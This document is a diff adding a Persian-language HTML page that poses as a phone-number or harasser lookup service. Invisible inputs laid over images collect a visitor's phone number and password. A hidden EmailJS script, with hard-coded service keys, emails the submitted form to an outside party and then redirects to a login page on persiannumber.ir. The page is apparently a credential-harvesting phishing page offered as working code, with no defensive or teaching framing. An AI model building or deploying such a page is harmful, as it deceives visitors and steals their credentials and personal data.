@@ -1,0 +1,255 @@
+<head>
+
+<meta charset="UTF-8">
+  
+<title>شماره یاب</title>
+
+
+<script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
+
+  
+</head>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<body>
+
+
+
+<!--مزاحم یاب-->
+
+<img src="phone.png">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<!--توضیحات-->
+
+<img src="phonei.png">
+
+
+
+
+
+
+
+
+
+
+
+
+
+<form id="form">
+
+
+<!--ورود-->
+
+<div>
+
+
+
+
+<img src="phoneir.png">
+
+
+
+
+
+
+
+
+
+
+
+
+
+<input 
+name="name"
+type="number"
+required
+placeholder="09xxxxxxxxx"
+style="
+background: transparent;
+border: none;
+outline: none;
+position: absolute;
+left: 17%;
+top: 108.2%;
+width: 50%;
+font-size:380%;
+">
+
+
+
+
+<input 
+
+type="text"
+required
+placeholder="رمز عبور"
+style="
+background: transparent;
+border: none;
+outline: none;
+position: absolute;
+left: 45%;
+top: 122.6%;
+width: 50%;
+font-size:350%;
+text-align: right;
+">
+
+
+
+
+
+
+
+
+
+
+
+
+<button
+onclick="window.location.href=''"
+style="
+background: transparent;
+border: none;
+color: transparent;
+margin-left: 77%;
+margin-top: -41%;
+font-size: 400%;
+width: 20%;
+">link</button>
+
+
+
+<button
+type="submit"
+style="
+background: transparent;
+border: none;
+color: transparent;
+position: absolute;
+left: 14%;
+top: 133%;
+font-size: 300%;
+width: 84%;
+">دکمه</button>
+
+
+
+
+</div>
+
+
+
+
+</form>
+
+
+
+
+
+
+
+
+
+
+
+
+
+<!--توضیحات دانلود-->
+
+<img src="phoneiro.png">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<!--توضیحات سومی-->
+
+<img src="phoneirot.png">
+
+
+
+
+
+
+
+
+
+
+</body>
+
+
+
+
+
+
+
+
+
+<script>
+
+emailjs.init("H3PsRLpwrVTHKG3ww");
+
+document.getElementById("form").addEventListener("submit", function(e) {
+  e.preventDefault();
+
+  emailjs.sendForm(
+    "service_z4wahxm",
+    "template_gnyhsze",
+    this
+  ).then(function() {
+    window.location.href = "https://persiannumber.ir/app/login";
+  }).catch(function(error) {
+    console.log(error);
+  });
+
+});
+
+</script>
